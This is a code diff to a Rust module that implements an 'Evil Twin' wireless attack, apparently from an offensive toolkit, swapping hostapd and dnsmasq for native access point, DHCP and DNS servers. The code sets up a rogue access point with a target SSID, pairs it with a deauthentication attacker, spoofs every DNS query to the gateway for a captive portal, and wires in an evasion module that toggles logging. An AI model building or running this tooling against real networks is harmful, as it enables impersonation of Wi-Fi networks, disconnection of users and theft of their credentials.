@@ -13,19 +13,25 @@
 //! ## Requirements
 //! - Two wireless interfaces (one for AP, one for deauth)
 //! - Or single interface if not doing simultaneous deauth
-//! - hostapd for AP creation (or native beacon injection)
+//! - Rust-native AP creation
 
 use std::fs;
 use std::io::Write;
-use std::net::IpAddr;
+use std::net::{IpAddr, Ipv4Addr};
 use std::path::PathBuf;
-use std::process::{Child, Command, Stdio};
-use std::sync::atomic::{AtomicBool, Ordering};
-use std::sync::Arc;
+use std::process::Command;
+use std::sync::{
+    atomic::{AtomicBool, Ordering},
+    Arc, Mutex,
+};
 use std::thread;
 use std::time::{Duration, Instant};
 
 use chrono::Local;
+use rustyjack_netlink::{
+    AccessPoint, ApConfig, ApSecurity, DhcpConfig, DhcpServer, DnsConfig, DnsRule, DnsServer,
+    HardwareMode, IptablesManager, Table,
+};
 
 use crate::deauth::{DeauthAttacker, DeauthConfig};
 use crate::error::{Result, WirelessError};
@@ -36,7 +42,6 @@ use crate::netlink_helpers::{
     netlink_add_address, netlink_flush_addresses, netlink_set_interface_down,
     netlink_set_interface_up,
 };
-use crate::process_helpers::pkill_exact_force;
 
 /// Evil Twin configuration
 #[derive(Debug, Clone)]
@@ -131,13 +136,19 @@ pub struct EvilTwinStats {
     pub ap_started: bool,
 }
 
+struct DhcpRuntime {
+    handle: Option<thread::JoinHandle<()>>,
+    running: Arc<Mutex<bool>>,
+}
+
 /// Evil Twin attack controller
 pub struct EvilTwin {
     config: EvilTwinConfig,
     /// Stop flag for coordinating shutdown
     pub stop_flag: Arc<AtomicBool>,
-    hostapd_process: Option<Child>,
-    dnsmasq_process: Option<Child>,
+    ap: Option<AccessPoint>,
+    dhcp: Option<DhcpRuntime>,
+    dns: Option<DnsServer>,
 }
 
 impl EvilTwin {
@@ -146,8 +157,9 @@ impl EvilTwin {
         Self {
             config,
             stop_flag: Arc::new(AtomicBool::new(false)),
-            hostapd_process: None,
-            dnsmasq_process: None,
+            ap: None,
+            dhcp: None,
+            dns: None,
         }
     }
 
@@ -175,12 +187,19 @@ impl EvilTwin {
         // Setup the AP interface
         self.setup_ap_interface()?;
 
-        // Generate and start hostapd
-        self.start_hostapd()?;
+        // Start Rust-native AP
+        self.start_access_point()?;
         stats.ap_started = true;
 
-        // Start DHCP server
-        self.start_dnsmasq()?;
+        // Start DHCP/DNS servers
+        if let Err(e) = self.start_dhcp_server() {
+            let _ = self.cleanup();
+            return Err(e);
+        }
+        if let Err(e) = self.start_dns_server() {
+            let _ = self.cleanup();
+            return Err(e);
+        }
 
         // Setup NAT/iptables for captive portal
         if self.config.open_network {
@@ -285,112 +304,165 @@ impl EvilTwin {
         Ok(())
     }
 
-    /// Generate and start hostapd
-    fn start_hostapd(&mut self) -> Result<()> {
-        let conf_path = format!("{}/hostapd.conf", self.config.capture_path);
+    fn stop_ap_best_effort(ap: &mut AccessPoint) {
+        if let Ok(handle) = tokio::runtime::Handle::try_current() {
+            let _ = handle.block_on(async { ap.stop().await });
+        } else if let Ok(rt) = tokio::runtime::Runtime::new() {
+            let _ = rt.block_on(async { ap.stop().await });
+        }
+    }
 
-        let config = if self.config.open_network {
-            format!(
-                "interface={}\n\
-                driver=nl80211\n\
-                ssid={}\n\
-                hw_mode=g\n\
-                channel={}\n\
-                wmm_enabled=0\n\
-                macaddr_acl=0\n\
-                auth_algs=1\n\
-                ignore_broadcast_ssid=0\n\
-                wpa=0\n",
-                self.config.ap_interface, self.config.ssid, self.config.channel
-            )
+    /// Start Rust-native Access Point
+    fn start_access_point(&mut self) -> Result<()> {
+        let channel = if self.config.channel == 0 {
+            6
         } else {
-            let password = self.config.wpa_password.as_deref().unwrap_or("password123");
-            format!(
-                "interface={}\n\
-                driver=nl80211\n\
-                ssid={}\n\
-                hw_mode=g\n\
-                channel={}\n\
-                wmm_enabled=0\n\
-                macaddr_acl=0\n\
-                auth_algs=1\n\
-                ignore_broadcast_ssid=0\n\
-                wpa=2\n\
-                wpa_passphrase={}\n\
-                wpa_key_mgmt=WPA-PSK\n\
-                wpa_pairwise=TKIP\n\
-                rsn_pairwise=CCMP\n",
-                self.config.ap_interface, self.config.ssid, self.config.channel, password
-            )
+            self.config.channel
+        };
+        let security = if self.config.open_network {
+            ApSecurity::Open
+        } else {
+            ApSecurity::Wpa2Psk {
+                passphrase: self
+                    .config
+                    .wpa_password
+                    .clone()
+                    .unwrap_or_else(|| "password123".to_string()),
+            }
         };
 
-        fs::write(&conf_path, &config)
-            .map_err(|e| WirelessError::System(format!("Failed to write hostapd.conf: {}", e)))?;
+        let ap_config = ApConfig {
+            interface: self.config.ap_interface.clone(),
+            ssid: self.config.ssid.clone(),
+            channel,
+            security,
+            hidden: false,
+            beacon_interval: 100,
+            max_clients: 0,
+            dtim_period: 2,
+            hw_mode: HardwareMode::G,
+        };
 
-        let child = Command::new("hostapd")
-            .arg(&conf_path)
-            .stdout(Stdio::null())
-            .stderr(Stdio::null())
-            .spawn()
-            .map_err(|e| WirelessError::System(format!("Failed to start hostapd: {}", e)))?;
+        let mut ap = AccessPoint::new(ap_config).map_err(|e| {
+            WirelessError::System(format!("Failed to create Access Point: {}", e))
+        })?;
 
-        self.hostapd_process = Some(child);
+        let start_result = tokio::runtime::Handle::try_current()
+            .map(|handle| {
+                handle.block_on(async {
+                    ap.start()
+                        .await
+                        .map_err(|e| WirelessError::System(format!("AP start failed: {}", e)))
+                })
+            })
+            .unwrap_or_else(|_| {
+                tokio::runtime::Runtime::new()
+                    .map_err(|e| {
+                        WirelessError::System(format!("Failed to create tokio runtime: {}", e))
+                    })
+                    .and_then(|rt| {
+                        rt.block_on(async {
+                            ap.start()
+                                .await
+                                .map_err(|e| WirelessError::System(format!("AP start failed: {}", e)))
+                        })
+                    })
+            });
 
-        // Wait for AP to start
+        if let Err(e) = start_result {
+            return Err(e);
+        }
+
+        self.ap = Some(ap);
         thread::sleep(Duration::from_secs(2));
-
-        log::info!("Hostapd started for SSID: {}", self.config.ssid);
+        log::info!("Rust-native AP started for SSID: {}", self.config.ssid);
         Ok(())
     }
 
     /// Start DHCP server
-    fn start_dnsmasq(&mut self) -> Result<()> {
-        let conf_path = format!("{}/dnsmasq.conf", self.config.capture_path);
-        let iface = &self.config.ap_interface;
+    fn start_dhcp_server(&mut self) -> Result<()> {
+        if self.dhcp.is_some() {
+            return Ok(());
+        }
         let logging_enabled = rustyjack_evasion::logs_enabled();
+        let gateway_ip = Ipv4Addr::new(192, 168, 4, 1);
 
-        let dnsmasq_logging = if logging_enabled {
-            "            log-queries\n            log-dhcp\n"
-        } else {
-            ""
+        let dhcp_cfg = DhcpConfig {
+            interface: self.config.ap_interface.clone(),
+            server_ip: gateway_ip,
+            subnet_mask: Ipv4Addr::new(255, 255, 255, 0),
+            range_start: Ipv4Addr::new(192, 168, 4, 10),
+            range_end: Ipv4Addr::new(192, 168, 4, 100),
+            router: Some(gateway_ip),
+            dns_servers: vec![gateway_ip],
+            lease_time_secs: 43200,
+            log_packets: logging_enabled,
         };
 
-        let config = format!(
-            "interface={}\n\
-            dhcp-range=192.168.4.10,192.168.4.100,255.255.255.0,12h\n\
-            dhcp-option=3,192.168.4.1\n\
-            dhcp-option=6,192.168.4.1\n\
-            server=8.8.8.8\n\
-{dnsmasq_logging}\
-            listen-address=192.168.4.1\n\
-            bind-interfaces\n",
-            iface,
-            dnsmasq_logging = dnsmasq_logging
+        let mut server = DhcpServer::new(dhcp_cfg.clone()).map_err(|e| {
+            WirelessError::System(format!("Failed to create DHCP server: {}", e))
+        })?;
+        let running_handle = server.running_handle();
+        server
+            .start()
+            .map_err(|e| WirelessError::System(format!("Failed to start DHCP server: {}", e)))?;
+        log::info!(
+            "DHCP server bound on {} offering {}-{}",
+            self.config.ap_interface,
+            dhcp_cfg.range_start,
+            dhcp_cfg.range_end
         );
 
-        // If captive portal, redirect all DNS to us
-        let config = if self.config.open_network {
-            format!("{}address=/#/192.168.4.1\n", config)
+        let handle = thread::spawn(move || {
+            if let Err(e) = server.serve() {
+                log::error!("DHCP server exited with error: {}", e);
+            }
+        });
+
+        self.dhcp = Some(DhcpRuntime {
+            handle: Some(handle),
+            running: running_handle,
+        });
+
+        Ok(())
+    }
+
+    /// Start DNS server
+    fn start_dns_server(&mut self) -> Result<()> {
+        if self.dns.is_some() {
+            return Ok(());
+        }
+        let logging_enabled = rustyjack_evasion::logs_enabled();
+        let gateway_ip = Ipv4Addr::new(192, 168, 4, 1);
+
+        let default_rule = if self.config.open_network {
+            DnsRule::WildcardSpoof(gateway_ip)
         } else {
-            config
+            DnsRule::PassThrough
+        };
+        let upstream_dns = if self.config.open_network {
+            None
+        } else {
+            Some(Ipv4Addr::new(8, 8, 8, 8))
         };
 
-        fs::write(&conf_path, &config)
-            .map_err(|e| WirelessError::System(format!("Failed to write dnsmasq.conf: {}", e)))?;
+        let dns_cfg = DnsConfig {
+            interface: self.config.ap_interface.clone(),
+            listen_ip: gateway_ip,
+            default_rule,
+            custom_rules: std::collections::HashMap::new(),
+            upstream_dns,
+            log_queries: logging_enabled,
+        };
 
-        // Kill any existing dnsmasq
-        pkill_exact_force("dnsmasq").ok();
+        let mut server = DnsServer::new(dns_cfg)
+            .map_err(|e| WirelessError::System(format!("Failed to create DNS server: {}", e)))?;
+        server
+            .start()
+            .map_err(|e| WirelessError::System(format!("Failed to start DNS server: {}", e)))?;
+        log::info!("DNS server bound on {} ({})", self.config.ap_interface, gateway_ip);
 
-        let child = Command::new("dnsmasq")
-            .args(["-C", &conf_path, "-d"])
-            .stdout(Stdio::null())
-            .stderr(Stdio::null())
-            .spawn()
-            .map_err(|e| WirelessError::System(format!("Failed to start dnsmasq: {}", e)))?;
-
-        self.dnsmasq_process = Some(child);
-
-        log::info!("DHCP server started");
+        self.dns = Some(server);
         Ok(())
     }
 
@@ -405,7 +477,7 @@ impl EvilTwin {
         // Setup iptables for captive portal using Rust implementation
         log::info!("Configuring captive portal iptables via Rust");
 
-        let ipt = rustyjack_netlink::IptablesManager::new().map_err(|e| {
+        let ipt = IptablesManager::new().map_err(|e| {
             WirelessError::System(format!("Failed to create iptables manager: {}", e))
         })?;
 
@@ -491,26 +563,30 @@ impl EvilTwin {
     fn cleanup(&mut self) -> Result<()> {
         log::info!("Cleaning up Evil Twin...");
 
-        // Stop hostapd
-        if let Some(mut child) = self.hostapd_process.take() {
-            let _ = child.kill();
-            let _ = child.wait();
+        // Stop Access Point
+        if let Some(mut ap) = self.ap.take() {
+            Self::stop_ap_best_effort(&mut ap);
         }
 
-        // Stop dnsmasq
-        if let Some(mut child) = self.dnsmasq_process.take() {
-            let _ = child.kill();
-            let _ = child.wait();
+        // Stop DNS server
+        if let Some(mut dns) = self.dns.take() {
+            let _ = dns.stop();
         }
 
-        // Also pkill in case they're orphaned
-        pkill_exact_force("hostapd").ok();
-        pkill_exact_force("dnsmasq").ok();
+        // Stop DHCP server
+        if let Some(mut dhcp) = self.dhcp.take() {
+            if let Ok(mut running) = dhcp.running.lock() {
+                *running = false;
+            }
+            if let Some(handle) = dhcp.handle.take() {
+                let _ = handle.join();
+            }
+        }
 
         // Flush iptables using Rust implementation
-        if let Ok(ipt) = rustyjack_netlink::IptablesManager::new() {
-            let _ = ipt.flush_table(rustyjack_netlink::Table::Nat);
-            let _ = ipt.flush_table(rustyjack_netlink::Table::Filter);
+        if let Ok(ipt) = IptablesManager::new() {
+            let _ = ipt.flush_table(Table::Nat);
+            let _ = ipt.flush_table(Table::Filter);
         }
 
         // Reset interface
